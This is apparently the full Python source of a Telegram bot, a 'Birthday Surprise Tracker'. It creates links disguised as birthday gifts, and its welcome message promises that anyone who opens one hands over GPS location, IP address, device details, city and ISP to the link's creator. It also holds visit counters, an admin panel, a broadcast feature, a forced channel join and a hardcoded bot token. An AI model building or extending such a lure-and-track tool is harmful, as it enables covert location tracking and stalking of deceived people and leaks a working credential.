#!/usr/bin/env python3
import requests
import json
import time
import os
import uuid
from datetime import datetime
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler

# ================= CONFIGURATION =================
BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs"
DEVELOPER = "@KINGITACHI18"
ADMIN_ID = 6323367629
BASE_URL = "https://birthday-gift-by-patel.vercel.app"

# Force Join Channel
FORCE_CHANNEL = "@modxpatel"
FORCE_CHANNEL_LINK = "https://t.me/modxpatel"
FORCE_CHANNEL_NAME = "MOD X PATEL"
# =================================================

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
OFFSET = 0

# Data storage
user_data = {}
created_links = {}

# ============ FORCE JOIN CHECK ============
def is_admin(user_id):
    return user_id == ADMIN_ID

def check_channel_join(user_id):
    try:
        url = f"{TELEGRAM_API}/getChatMember"
        params = {"chat_id": FORCE_CHANNEL, "user_id": user_id}
        resp = requests.get(url, params=params, timeout=10)
        
        if resp.status_code == 200:
            data = resp.json()
            if data.get("ok"):
                status = data.get("result", {}).get("status", "")
                if status in ["member", "administrator", "creator"]:
                    return True
        return False
    except:
        return False

def get_force_join_keyboard():
    return {
        "inline_keyboard": [
            [{"text": f"📢 JOIN {FORCE_CHANNEL_NAME}", "url": FORCE_CHANNEL_LINK}],
            [{"text": "✅ I HAVE JOINED", "callback_data": "verify_join"}]
        ]
    }

# ============ HEALTH SERVER ============
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot Running")
    def log_message(self, *args): pass

def run_health_server():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(('0.0.0.0', port), HealthHandler).serve_forever()

# ============ SEND MESSAGE ============
def send_msg(chat_id, text, reply_markup=None, parse_mode="HTML"):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    
    try:
        requests.post(url, json=payload, timeout=30)
    except Exception as e:
        print(f"Send error: {e}")

def edit_msg(chat_id, msg_id, text, reply_markup=None):
    url = f"{TELEGRAM_API}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": msg_id,
        "text": text,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=30)
    except:
        pass

def send_callback(chat_id, text, callback_id):
    url = f"{TELEGRAM_API}/answerCallbackQuery"
    try:
        requests.post(url, json={"callback_query_id": callback_id, "text": text}, timeout=5)
    except:
        pass

# ============ KEYBOARDS ============
def user_keyboard():
    return {
        "keyboard": [
            ["🎁 CREATE TRACKING LINK"],
            ["📊 MY LINKS"]
        ],
        "resize_keyboard": True,
        "is_persistent": True
    }

def admin_keyboard():
    return {
        "keyboard": [
            ["📊 ADMIN STATS"],
            ["👥 USER LIST"],
            ["📜 ALL LINKS"],
            ["📢 BROADCAST"],
            ["🔙 MAIN MENU"]
        ],
        "resize_keyboard": True
    }

def cancel_keyboard():
    return {
        "keyboard": [["❌ CANCEL"]],
        "resize_keyboard": True
    }

def back_keyboard():
    return {
        "keyboard": [["🔙 BACK TO MENU"]],
        "resize_keyboard": True
    }

# ============ DATA MANAGEMENT ============
def save_user(user_id, name, username):
    uid = str(user_id)
    if uid not in user_data:
        user_data[uid] = {
            "id": user_id,
            "name": name,
            "username": username,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "links_created": 0,
            "total_visits": 0
        }
        save_data()
        return True
    return False

def add_link(user_id, link_id, name):
    uid = str(user_id)
    if uid not in created_links:
        created_links[uid] = {}
    
    created_links[uid][link_id] = {
        "name": name,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "visits": 0,
        "last_visit": None
    }
    
    if uid in user_data:
        user_data[uid]["links_created"] = user_data[uid].get("links_created", 0) + 1
    
    save_data()

def update_visit(link_id):
    for uid, links in created_links.items():
        if link_id in links:
            links[link_id]["visits"] += 1
            links[link_id]["last_visit"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if uid in user_data:
                user_data[uid]["total_visits"] = user_data[uid].get("total_visits", 0) + 1
            save_data()
            return True
    return False

def get_user_links(user_id):
    uid = str(user_id)
    return created_links.get(uid, {})

def save_data():
    try:
        with open("user_data.json", "w") as f:
            json.dump(user_data, f, indent=2)
        with open("links.json", "w") as f:
            json.dump(created_links, f, indent=2)
    except:
        pass

def load_data():
    global user_data, created_links
    try:
        with open("user_data.json", "r") as f:
            user_data = json.load(f)
    except:
        user_data = {}
    try:
        with open("links.json", "r") as f:
            created_links = json.load(f)
    except:
        created_links = {}

# ============ ADMIN FUNCTIONS ============
def get_admin_stats():
    total_users = len(user_data)
    total_links = 0
    total_visits = 0
    
    for links in created_links.values():
        for link in links.values():
            total_links += 1
            total_visits += link.get('visits', 0)
    
    msg = f"""📊 <b>ADMIN STATS</b>

👥 Total Users: {total_users}
🎁 Total Links: {total_links}
👁️ Total Visits: {total_visits}

👨‍💻 Developer: {DEVELOPER}"""
    return msg

def get_user_list():
    if not user_data:
        return "📭 No users found"
    
    msg = "👥 <b>USER LIST</b>\n\n"
    count = 0
    for uid, data in user_data.items():
        count += 1
        if count > 30:
            msg += f"\n⚠️ Showing first 30 of {len(user_data)} users"
            break
        msg += f"🆔 <code>{uid}</code>\n"
        msg += f"👤 {data.get('name', 'Unknown')} (@{data.get('username', 'N/A')})\n"
        msg += f"📅 Joined: {data.get('joined', 'Unknown')[:16]}\n"
        msg += f"🎁 Links: {data.get('links_created', 0)} | 👁️ Visits: {data.get('total_visits', 0)}\n"
        msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
    
    return msg

def get_all_links():
    if not created_links:
        return "📭 No links created yet"
    
    msg = "🔗 <b>ALL TRACKING LINKS</b>\n\n"
    count = 0
    for uid, links in created_links.items():
        user_name = user_data.get(uid, {}).get('name', 'Unknown')
        for link_id, data in links.items():
            count += 1
            if count > 50:
                msg += f"\n⚠️ Showing first 50 links"
                return msg
            msg += f"👤 {user_name}\n"
            msg += f"🎁 {data.get('name', 'Unknown')}\n"
            msg += f"👁️ Visits: {data.get('visits', 0)}\n"
            msg += f"📅 Created: {data.get('created', 'Unknown')[:16]}\n"
            msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
    
    return msg

def broadcast_to_all(message):
    success = 0
    fail = 0
    
    for uid in user_data.keys():
        try:
            send_msg(int(uid), f"📢 <b>BROADCAST MESSAGE</b>\n\n{message}\n\n- {DEVELOPER}")
            success += 1
            time.sleep(0.05)
        except:
            fail += 1
    
    return success, fail

# ============ USER FUNCTIONS ============
def handle_user_start(chat_id, user_id, name, username):
    save_user(user_id, name, username)
    
    # Check force join
    joined = check_channel_join(user_id)
    if not joined:
        msg = f"❌ <b>Access Denied!</b>\n\nTo use this bot, you must join our channel first:\n\n📢 <b>{FORCE_CHANNEL_NAME}</b>\n🔗 {FORCE_CHANNEL_LINK}\n\nAfter joining, click the Verify button below ✅"
        send_msg(chat_id, msg, get_force_join_keyboard())
        return
    
    msg = f"""🎁 <b>BIRTHDAY SURPRISE TRACKER</b> 🎁

Create a fake birthday gift link and share it!
When someone opens it, you'll get their:
📍 GPS Location
🌐 IP Address
📱 Device Info
🏙️ City & ISP

👇 Click buttons below to create your first link!"""

    send_msg(chat_id, msg, user_keyboard())

def handle_create_link(chat_id):
    send_msg(chat_id, "🎁 <b>Create Tracking Link</b>\n\nSend a name for this link (e.g., Friend, Raj, Cousin):", cancel_keyboard())
    waiting_for_input[chat_id] = {"action": "create_link"}

def create_link(chat_id, user_id, name):
    link_id = str(uuid.uuid4())[:8]
    add_link(user_id, link_id, name)
    
    link = f"{BASE_URL}/?id={link_id}&name={name.replace(' ', '%20')}"
    
    msg = f"""✅ <b>Link Created Successfully!</b>

🎁 <b>Name:</b> {name}
🔗 <b>Link:</b> <code>{link}</code>

Share this link as a "Birthday Surprise Gift"!

Use /mylinks to see all your links."""
    
    send_msg(chat_id, msg, user_keyboard())

def handle_my_links(chat_id, user_id):
    links = get_user_links(user_id)
    
    if not links:
        send_msg(chat_id, "📭 <b>No links created yet</b>\n\nUse CREATE TRACKING LINK button to make your first link!", user_keyboard())
        return
    
    msg = "🎁 <b>YOUR TRACKING LINKS</b>\n\n"
    for link_id, data in links.items():
        msg += f"🔹 <b>{data['name']}</b>\n"
        msg += f"   👁️ Opens: {data['visits']}\n"
        msg += f"   📅 Created: {data['created'][:16]}\n"
        msg += f"   🔗 <code>{BASE_URL}/?id={link_id}&name={data['name'].replace(' ', '%20')}</code>\n\n"
    
    send_msg(chat_id, msg, back_keyboard())

def handle_user_back(chat_id):
    send_msg(chat_id, "🏠 MAIN MENU", user_keyboard())

# ============ ADMIN FUNCTIONS ============
def handle_admin_panel(chat_id):
    msg = f"""👑 <b>ADMIN PANEL</b> 👑

Welcome Admin!

Use admin buttons to manage the bot."""
    send_msg(chat_id, msg, admin_keyboard())

def handle_admin_stats(chat_id):
    send_msg(chat_id, get_admin_stats())

def handle_user_list(chat_id):
    msg_text = get_user_list()
    if len(msg_text) > 4000:
        for i in range(0, len(msg_text), 4000):
            send_msg(chat_id, msg_text[i:i+4000])
    else:
        send_msg(chat_id, msg_text)

def handle_all_links(chat_id):
    msg_text = get_all_links()
    if len(msg_text) > 4000:
        for i in range(0, len(msg_text), 4000):
            send_msg(chat_id, msg_text[i:i+4000])
    else:
        send_msg(chat_id, msg_text)

def handle_broadcast(chat_id):
    send_msg(chat_id, "📢 <b>BROADCAST MODE</b>\n\nSend me the message you want to broadcast to all users.\n\nType /cancel to cancel.", cancel_keyboard())
    broadcast_mode[chat_id] = True

def execute_broadcast(chat_id, message):
    send_msg(chat_id, "⏳ Sending broadcast to all users...")
    success, fail = broadcast_to_all(message)
    send_msg(chat_id, f"✅ <b>Broadcast Complete</b>\n\n📤 Sent: {success}\n❌ Failed: {fail}", admin_keyboard())

# ============ CALLBACK HANDLER ============
def handle_callback(update):
    if "callback_query" not in update:
        return
    
    callback = update["callback_query"]
    callback_id = callback.get("id")
    chat_id = callback.get("message", {}).get("chat", {}).get("id", 0)
    message_id = callback.get("message", {}).get("message_id", 0)
    data = callback.get("data", "")
    user_id = callback.get("from", {}).get("id", 0)
    
    if data == "verify_join":
        joined = check_channel_join(user_id)
        
        if joined:
            edit_msg(chat_id, message_id, 
                "✅ <b>Verification Successful!</b>\n\nYou have joined the channel. You can now use the bot!\n\nClick /start to begin.",
                None
            )
            save_user(user_id, callback.get("from", {}).get("first_name", "User"), callback.get("from", {}).get("username", ""))
        else:
            edit_msg(chat_id, message_id,
                f"❌ <b>Verification Failed!</b>\n\nYou haven't joined {FORCE_CHANNEL_NAME} channel.\n\nPlease join the channel and click verify again.",
                get_force_join_keyboard()
            )
        
        send_callback(chat_id, "Verification checked!", callback_id)

# ============ UPDATE HANDLER ============
waiting_for_input = {}
broadcast_mode = {}

def handle_update(update):
    global OFFSET
    
    # Handle callbacks first
    if "callback_query" in update:
        handle_callback(update)
        OFFSET = update.get("update_id", OFFSET) + 1
        return
    
    if "message" not in update:
        return
    
    msg = update["message"]
    chat_id = msg.get("chat", {}).get("id", 0)
    text = msg.get("text", "")
    user_id = msg.get("from", {}).get("id", 0)
    name = msg.get("from", {}).get("first_name", "User")
    username = msg.get("from", {}).get("username", "")
    
    print(f"📨 {name}: {text[:40]}")
    
    # Check broadcast mode (admin only)
    if chat_id in broadcast_mode:
        if text == "❌ CANCEL" or text == "/cancel":
            del broadcast_mode[chat_id]
            send_msg(chat_id, "❌ Broadcast cancelled!", admin_keyboard())
            return
        else:
            del broadcast_mode[chat_id]
            execute_broadcast(chat_id, text)
            return
    
    # Check waiting for input
    if chat_id in waiting_for_input:
        action = waiting_for_input[chat_id].get("action")
        
        if text == "❌ CANCEL" or text == "/cancel":
            del waiting_for_input[chat_id]
            kb = admin_keyboard() if is_admin(user_id) else user_keyboard()
            send_msg(chat_id, "❌ Cancelled!", kb)
            return
        
        if action == "create_link":
            del waiting_for_input[chat_id]
            if text and len(text) < 50:
                create_link(chat_id, user_id, text)
            else:
                kb = admin_keyboard() if is_admin(user_id) else user_keyboard()
                send_msg(chat_id, "❌ Name too long! Try again!", kb)
        return
    
    # ============ COMMANDS ============
    
    # /admin command - only for admin
    if text == "/admin":
        if is_admin(user_id):
            handle_admin_panel(chat_id)
        else:
            send_msg(chat_id, "❌ You are not authorized to use admin panel!")
        return
    
    # /start command - normal user menu
    if text == "/start":
        if is_admin(user_id):
            # Admin bhi normal user menu dekh sakta hai
            handle_user_start(chat_id, user_id, name, username)
        else:
            handle_user_start(chat_id, user_id, name, username)
        return
    
    # Admin commands (only if admin)
    if is_admin(user_id):
        if text == "📊 ADMIN STATS":
            handle_admin_stats(chat_id)
        elif text == "👥 USER LIST":
            handle_user_list(chat_id)
        elif text == "📜 ALL LINKS":
            handle_all_links(chat_id)
        elif text == "📢 BROADCAST":
            handle_broadcast(chat_id)
        elif text == "🔙 MAIN MENU":
            send_msg(chat_id, "👑 Admin Panel", admin_keyboard())
        elif text == "/mylinks":
            handle_my_links(chat_id, user_id)
        elif text == "🎁 CREATE TRACKING LINK":
            handle_create_link(chat_id)
        elif text == "📊 MY LINKS":
            handle_my_links(chat_id, user_id)
        elif text == "🔙 BACK TO MENU":
            handle_user_back(chat_id)
        else:
            # If not an admin command, treat as normal user
            if text == "🎁 CREATE TRACKING LINK":
                handle_create_link(chat_id)
            elif text == "📊 MY LINKS":
                handle_my_links(chat_id, user_id)
            elif text == "🔙 BACK TO MENU":
                handle_user_back(chat_id)
            else:
                send_msg(chat_id, "❌ Unknown command!\n\nUse the buttons below 👇", user_keyboard())
        return
    
    # Normal user commands
    if text == "🎁 CREATE TRACKING LINK":
        handle_create_link(chat_id)
    
    elif text == "📊 MY LINKS":
        handle_my_links(chat_id, user_id)
    
    elif text == "🔙 BACK TO MENU":
        handle_user_back(chat_id)
    
    elif text == "/mylinks":
        handle_my_links(chat_id, user_id)
    
    else:
        send_msg(chat_id, "❌ Unknown command!\n\nUse the buttons below 👇", user_keyboard())

# ============ MAIN ============
def main():
    load_data()
    
    # Start health server
    health_thread = Thread(target=run_health_server, daemon=True)
    health_thread.start()
    
    print("=" * 50)
    print("🎁 BIRTHDAY SURPRISE TRACKER BOT")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"📢 Force Join: {FORCE_CHANNEL_NAME}")
    print(f"👨‍💻 Developer: {DEVELOPER}")
    print("=" * 50)
    print("📌 Commands:")
    print("   /start - User menu")
    print("   /admin - Admin panel (admin only)")
    print("=" * 50)
    
    global OFFSET
    while True:
        try:
            resp = requests.get(f"{TELEGRAM_API}/getUpdates", 
                               params={"offset": OFFSET, "timeout": 30}, timeout=35)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok"):
                    for update in data.get("result", []):
                        handle_update(update)
                        OFFSET = update.get("update_id", OFFSET) + 1
            time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n👋 Bot stopped!")
            break
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
